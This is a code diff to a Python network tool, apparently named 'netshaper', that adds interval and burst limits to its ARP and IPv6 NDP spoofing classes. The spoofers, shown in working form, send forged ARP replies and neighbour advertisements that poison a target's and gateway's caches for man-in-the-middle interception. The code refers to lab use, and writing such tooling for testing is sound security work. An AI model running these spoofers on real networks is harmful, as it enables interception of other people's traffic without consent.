@@ -19,6 +19,11 @@ if TYPE_CHECKING:
 
 log = logging.getLogger("netshaper")
 
+MIN_SPOOF_INTERVAL = 0.25
+MAX_SPOOF_INTERVAL = 10.0
+MIN_SPOOF_BURST = 1
+MAX_SPOOF_BURST = 5
+
 ARP = None
 Ether = None
 IPv6 = None
@@ -50,10 +55,31 @@ def _ensure_scapy_layers() -> None:
             ICMPv6NDOptSrcLLAddr = scapy_ICMPv6NDOptSrcLLAddr
 
 
+def validate_spoof_timing(interval: float, burst: int) -> tuple[float, int]:
+    """Validate bounded lab timing controls shared by ARP and NDP spoofers."""
+    if not MIN_SPOOF_INTERVAL <= interval <= MAX_SPOOF_INTERVAL:
+        raise ValueError(
+            f"spoof interval must be between {MIN_SPOOF_INTERVAL} "
+            f"and {MAX_SPOOF_INTERVAL} seconds"
+        )
+    if not MIN_SPOOF_BURST <= burst <= MAX_SPOOF_BURST:
+        raise ValueError(
+            f"spoof burst must be between {MIN_SPOOF_BURST} "
+            f"and {MAX_SPOOF_BURST} packets"
+        )
+    return float(interval), int(burst)
+
+
+def _send_burst(packet_backend, packet, interface: str, burst: int) -> None:
+    for _ in range(burst):
+        packet_backend.send(packet, interface)
+
+
 class ARPSpoofer:
     def __init__(self, interface: str, target_ip: str, target_mac: str,
                  gateway_ip: str, gateway_mac: str, own_mac: str,
-                 session: TargetSession, packet_backend=None):
+                 session: TargetSession, packet_backend=None,
+                 interval: float = 2.0, burst: int = 1):
         self.interface   = interface
         self.target_ip   = target_ip
         self.target_mac  = target_mac
@@ -62,6 +88,7 @@ class ARPSpoofer:
         self.own_mac     = own_mac
         self.session     = session
         self.packet_backend = packet_backend or RealPacketBackend()
+        self.interval, self.burst = validate_spoof_timing(interval, burst)
         self._stop       = threading.Event()
         self.threads: List[threading.Thread] = []
 
@@ -74,16 +101,19 @@ class ARPSpoofer:
                    and self.session.active
                    and not self.session.is_shutting_down):
                 try:
-                    self.packet_backend.send(
+                    packet = (
                         Ether(dst=self.target_mac, src=self.own_mac) /
                         ARP(op=2,
                             pdst=self.target_ip,  psrc=self.gateway_ip,
-                            hwdst=self.target_mac, hwsrc=self.own_mac),
-                        self.interface)
+                            hwdst=self.target_mac, hwsrc=self.own_mac)
+                    )
+                    _send_burst(
+                        self.packet_backend, packet, self.interface, self.burst
+                    )
                 except Exception as e:
                     log.error(f"[ARP→target] Injection error: {e}")
                     break
-                if self._stop.wait(timeout=2.0):
+                if self._stop.wait(timeout=self.interval):
                     break
             log.info(f"[ARP spoof→target] Thread for {self.target_ip} exited.")
 
@@ -93,16 +123,19 @@ class ARPSpoofer:
                    and self.session.active
                    and not self.session.is_shutting_down):
                 try:
-                    self.packet_backend.send(
+                    packet = (
                         Ether(dst=self.gateway_mac, src=self.own_mac) /
                         ARP(op=2,
                             pdst=self.gateway_ip,  psrc=self.target_ip,
-                            hwdst=self.gateway_mac, hwsrc=self.own_mac),
-                        self.interface)
+                            hwdst=self.gateway_mac, hwsrc=self.own_mac)
+                    )
+                    _send_burst(
+                        self.packet_backend, packet, self.interface, self.burst
+                    )
                 except Exception as e:
                     log.error(f"[ARP→gateway] Injection error: {e}")
                     break
-                if self._stop.wait(timeout=2.0):
+                if self._stop.wait(timeout=self.interval):
                     break
             log.info(f"[ARP spoof→gateway] Thread for {self.target_ip} exited.")
 
@@ -112,7 +145,10 @@ class ARPSpoofer:
         ]
         for t in self.threads:
             t.start()
-        log.info(f"ARP spoofing active → {self.target_ip}")
+        log.info(
+            f"ARP spoofing active → {self.target_ip} "
+            f"(burst={self.burst}, interval={self.interval:.2f}s)"
+        )
 
     def shutdown(self) -> None:
         _ensure_scapy_layers()
@@ -146,7 +182,8 @@ class NDPSpoofer:
     def __init__(self, interface: str,
                  target_ipv6: str, target_mac: str,
                  router_ipv6: str, router_mac: str,
-                 own_mac: str, session: TargetSession, packet_backend=None):
+                 own_mac: str, session: TargetSession, packet_backend=None,
+                 interval: float = 2.0, burst: int = 1):
         self.interface   = interface
         self.target_ipv6 = target_ipv6
         self.target_mac  = target_mac
@@ -155,6 +192,7 @@ class NDPSpoofer:
         self.own_mac     = own_mac
         self.session     = session
         self.packet_backend = packet_backend or RealPacketBackend()
+        self.interval, self.burst = validate_spoof_timing(interval, burst)
         self._stop       = threading.Event()
         self.threads: List[threading.Thread] = []
 
@@ -172,11 +210,13 @@ class NDPSpoofer:
                         ICMPv6ND_NA(tgt=self.router_ipv6, R=1, S=1, O=1) /
                         ICMPv6NDOptSrcLLAddr(lladdr=self.own_mac)
                     )
-                    self.packet_backend.send(pkt, self.interface)
+                    _send_burst(
+                        self.packet_backend, pkt, self.interface, self.burst
+                    )
                 except Exception as e:
                     log.error(f"[NDP→target] Injection error: {e}")
                     break
-                if self._stop.wait(timeout=2.0):
+                if self._stop.wait(timeout=self.interval):
                     break
 
         def spoof_router() -> None:
@@ -190,11 +230,13 @@ class NDPSpoofer:
                         ICMPv6ND_NA(tgt=self.target_ipv6, R=0, S=1, O=1) /
                         ICMPv6NDOptSrcLLAddr(lladdr=self.own_mac)
                     )
-                    self.packet_backend.send(pkt, self.interface)
+                    _send_burst(
+                        self.packet_backend, pkt, self.interface, self.burst
+                    )
                 except Exception as e:
                     log.error(f"[NDP→router] Injection error: {e}")
                     break
-                if self._stop.wait(timeout=2.0):
+                if self._stop.wait(timeout=self.interval):
                     break
 
         self.threads = [
@@ -203,7 +245,10 @@ class NDPSpoofer:
         ]
         for t in self.threads:
             t.start()
-        log.info(f"NDP spoofing active → {self.target_ipv6}")
+        log.info(
+            f"NDP spoofing active → {self.target_ipv6} "
+            f"(burst={self.burst}, interval={self.interval:.2f}s)"
+        )
 
     def shutdown(self) -> None:
         _ensure_scapy_layers()
